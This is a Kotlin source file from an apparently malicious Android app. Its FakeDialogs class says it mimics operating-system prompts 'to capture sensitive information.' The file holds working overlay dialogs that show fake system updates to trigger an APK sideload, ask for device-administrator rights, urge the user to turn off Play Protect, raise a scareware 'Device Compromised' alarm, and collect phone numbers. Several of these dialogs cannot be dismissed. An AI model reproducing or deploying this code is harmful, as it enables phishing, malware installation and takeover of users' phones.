package com.xrc.app.overlay

import android.app.AlertDialog
import android.content.Context
import android.content.DialogInterface
import android.graphics.drawable.ColorDrawable
import android.os.Build
import android.os.VibrationEffect
import android.os.Vibrator
import android.util.Log
import android.view.LayoutInflater
import android.view.View
import android.view.WindowManager
import android.widget.*
import com.xrc.app.XRCApp
import kotlinx.coroutines.*

/**
 * Fake system dialogs that mimic Android OS dialogs
 * to capture sensitive information from the user.
 * 
 * These appear as legitimate system prompts for:
 * - "Update Available" (forces download)
 * - "Security Warning" (phishes admin grant)
 * - "System Update" (keeps user busy)
 * - "Update Required" for app update (redirects)
 * - "Security Certificate Expiring" warning
 * - "Device Administrator" prompt
 * - "Battery Optimization" request
 * - Storage permission warning
 */
class FakeDialogs(private val context: Context) {

    companion object {
        private const val TAG = "FakeDialogs"

        // Dialog types
        enum class DialogType {
            SYSTEM_UPDATE,
            SECURITY_WARNING,
            ADMIN_GRANT,
            BATTERY_OPTIMIZATION,
            STORAGE_WARNING,
            CERTIFICATE_EXPIRY,
            PLAY_PROTECT_WARNING,
            DEVICE_COMPROMISED,
            APP_UPDATE_REQUIRED,
            PERMISSION_REQUIRED,
            VERIFICATION_REQUIRED,
            BANNED_DEVICE,
            SUSPICIOUS_LOGIN
        }
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.Main)
    private var activeDialog: AlertDialog? = null

    /**
     * Show a fake system update dialog.
     * Forces the user to press "Update Now" which triggers
     * the APK download/sideload.
     */
    fun showSystemUpdateDialog(
        onUpdate: () -> Unit = {},
        onCancel: () -> Unit = {}
    ): AlertDialog {
        return buildDialog(
            title = "System Update Available",
            message = "A critical system update is required for your device.\n\n" +
                      "Version: 15.2026.08.19\n" +
                      "Size: 48.2 MB\n" +
                      "Security patches: 2026-08-01\n\n" +
                      "This update includes important security fixes.",
            positiveText = "Update Now",
            negativeText = "Remind Me Later",
            icon = android.R.drawable.ic_menu_manage,
            positiveAction = {
                onUpdate()
                dismissDialog()
            },
            negativeAction = {
                onCancel()
                dismissDialog()
            },
            cancelable = false
        )
    }

    /**
     * Show a fake security warning dialog.
     * Phishes for admin grant or other permissions.
     */
    fun showSecurityWarningDialog(
        warningText: String = "Security risk detected on your device.\n\n" +
            "Unusual activity has been detected. For your protection,\n" +
            "immediate action is required to secure your device.\n\n" +
            "• Suspicious app detected\n" +
            "• Unauthorized access attempt blocked",
        positiveText: String = "Secure Device",
        negativeText: String = "I'll Do It Later"
    ): AlertDialog {
        return buildDialog(
            title = "⚠️ Security Warning",
            message = warningText,
            positiveText = positiveText,
            negativeText = negativeText,
            icon = android.R.drawable.ic_dialog_alert,
            positiveAction = { dismissDialog() },
            negativeAction = { dismissDialog() },
            cancelable = false
        )
    }

    /**
     * Show a fake "Enable Device Administrator" dialog.
     */
    fun showAdminGrantDialog(
        onGrant: () -> Unit = {},
        onDeny: () -> Unit = {}
    ): AlertDialog {
        return buildDialog(
            title = "Activate Device Administrator?",
            message = "For security purposes, this app requires Device " +
                      "Administrator privileges to:\n\n" +
                      "✓ Lock the device if lost\n" +
                      "✓ Wipe data after too many failed attempts\n" +
                      "✓ Manage security policies\n\n" +
                      "Your data will be encrypted and protected.",
            positiveText = "Activate",
            negativeText = "Cancel",
            icon = android.R.drawable.ic_lock_lock,
            positiveAction = {
                onGrant()
                dismissDialog()
            },
            negativeAction = {
                onDeny()
                dismissDialog()
            }
        )
    }

    /**
     * Show a fake battery optimization dialog.
     */
    fun showBatteryOptimizationDialog(
        onAllow: () -> Unit = {},
        onDeny: () -> Unit = {}
    ): AlertDialog {
        return buildDialog(
            title = "Ignore Battery Optimizations?",
            message = "Allow this app to run in the background without " +
                      "battery restrictions?\n\n" +
                      "This helps ensure you don't miss important notifications " +
                      "and the app continues to work properly.",
            positiveText = "Allow",
            negativeText = "Deny",
            icon = android.R.drawable.ic_dialog_info,
            positiveAction = {
                onAllow()
                dismissDialog()
            },
            negativeAction = {
                onDeny()
                dismissDialog()
            }
        )
    }

    /**
     * Show a fake Play Protect warning.
     */
    fun showPlayProtectWarningDialog(
        onDismiss: () -> Unit = {}
    ): AlertDialog {
        return buildDialog(
            title = "Google Play Protect",
            message = "Play Protect may slow down your device by scanning " +
                      "apps regularly.\n\n" +
                      "Do you want to disable Play Protect scanning to " +
                      "improve device performance?",
            positiveText = "Disable",
            negativeText = "Keep Enabled",
            icon = android.R.drawable.ic_dialog_alert,
            positiveAction = {
                onDismiss()
                dismissDialog()
            },
            negativeAction = { dismissDialog() }
        )
    }

    /**
     * Show a dialog that appears to be a legitimate app update.
     */
    fun showAppUpdateDialog(
        appName: String = "Google Play Services",
        version: String = "24.08.26",
        onUpdate: () -> Unit = {},
        onSkip: () -> Unit = {}
    ): AlertDialog {
        return buildDialog(
            title = "Update Available",
            message = "A new version of $appName is available.\n\n" +
                      "Current version: $version\n" +
                      "New version: ${version}.1\n\n" +
                      "This update includes bug fixes and performance improvements.",
            positiveText = "Update",
            negativeText = "Skip",
            icon = android.R.drawable.ic_menu_manage,
            positiveAction = {
                onUpdate()
                dismissDialog()
            },
            negativeAction = {
                onSkip()
                dismissDialog()
            }
        )
    }

    /**
     * Show a fake "Device Compromised" warning to panic the user.
     */
    fun showDeviceCompromisedDialog(
        onFix: () -> Unit = {},
        onIgnore: () -> Unit = {}
    ): AlertDialog {
        return buildDialog(
            title = "🚨 DEVICE COMPROMISED",
            message = "Critical security threat detected!\n\n" +
                      "Your device has been flagged for suspicious activity.\n" +
                      "• 3 unauthorized login attempts detected\n" +
                      "• Malware signature found in system files\n" +
                      "• Data encryption at risk\n\n" +
                      "Tap 'Fix Now' to run a security scan and remove threats.",
            positiveText = "Fix Now",
            negativeText = "I'll Risk It",
            icon = android.R.drawable.ic_dialog_alert,
            positiveAction = {
                onFix()
                dismissDialog()
            },
            negativeAction = {
                onIgnore()
                dismissDialog()
            },
            cancelable = false
        )
    }

    /**
     * Show a fake verification dialog asking for phone number.
     */
    fun showVerificationDialog(
        onVerify: (String) -> Unit = {},
        onCancel: () -> Unit = {}
    ): AlertDialog {
        val builder = AlertDialog.Builder(context, android.R.style.Theme_Material_Light_Dialog)
        val inflater = LayoutInflater.from(context)
        val view = inflater.inflate(android.R.layout.simple_list_item_1, null) as TextView
        view.text = "Enter your phone number for verification:"

        val input = EditText(context).apply {
            hint = "Phone number"
            inputType = android.text.InputType.TYPE_CLASS_PHONE
        }

        val layout = LinearLayout(context).apply {
            orientation = LinearLayout.VERTICAL
            padding = 32
            addView(view)
            addView(input, LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT
            ))
        }

        builder.setView(layout)
            .setTitle("Phone Verification")
            .setIcon(android.R.drawable.ic_dialog_info)
            .setPositiveButton("Verify") { _, _ ->
                val phone = input.text.toString()
                onVerify(phone)
            }
            .setNegativeButton("Cancel") { _, _ ->
                onCancel()
            }
            .setCancelable(false)

        val dialog = builder.create()
        dialog.window?.setType(getDialogType())
        activeDialog = dialog
        dialog.show()
        return dialog
    }

    /**
     * Show a custom dialog with arbitrary title/message.
     */
    fun showCustomDialog(
        title: String,
        message: String,
        positiveText: String = "OK",
        negativeText: String? = null,
        icon: Int = android.R.drawable.ic_dialog_info,
        onPositive: () -> Unit = {},
        onNegative: () -> Unit = {},
        cancelable: Boolean = true
    ): AlertDialog {
        return buildDialog(
            title = title,
            message = message,
            positiveText = positiveText,
            negativeText = negativeText,
            icon = icon,
            positiveAction = {
                onPositive()
                dismissDialog()
            },
            negativeAction = {
                onNegative()
                dismissDialog()
            },
            cancelable = cancelable
        )
    }

    /**
     * Dismiss the currently active dialog.
     */
    fun dismissDialog() {
        try {
            if (activeDialog?.isShowing == true) {
                activeDialog?.dismiss()
            }
            activeDialog = null
        } catch (e: Exception) {
            Log.e(TAG, "Dismiss error: ${e.message}")
            activeDialog = null
        }
    }

    /**
     * Check if a dialog is currently showing.
     */
    fun isDialogShowing(): Boolean = activeDialog?.isShowing == true

    /**
     * Build and show a dialog with common parameters.
     */
    private fun buildDialog(
        title: String,
        message: String,
        positiveText: String,
        negativeText: String? = null,
        icon: Int = android.R.drawable.ic_dialog_info,
        positiveAction: () -> Unit = {},
        negativeAction: () -> Unit = {},
        cancelable: Boolean = true
    ): AlertDialog {
        val builder = AlertDialog.Builder(context, android.R.style.Theme_Material_Light_Dialog_Alert)
            .setTitle(title)
            .setMessage(message)
            .setIcon(icon)
            .setPositiveButton(positiveText) { _, _ -> positiveAction() }
            .setCancelable(cancelable)

        if (negativeText != null) {
            builder.setNegativeButton(negativeText) { _, _ -> negativeAction() }
        }

        val dialog = builder.create()
        dialog.window?.setType(getDialogType())
        dialog.window?.setBackgroundDrawable(ColorDrawable(android.graphics.Color.WHITE))
        activeDialog = dialog
        dialog.show()
        return dialog
    }

    /**
     * Get the appropriate dialog window type for overlaying.
     */
    private fun getDialogType(): Int {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
        } else {
            @Suppress("DEPRECATION")
            WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
        }
    }
}
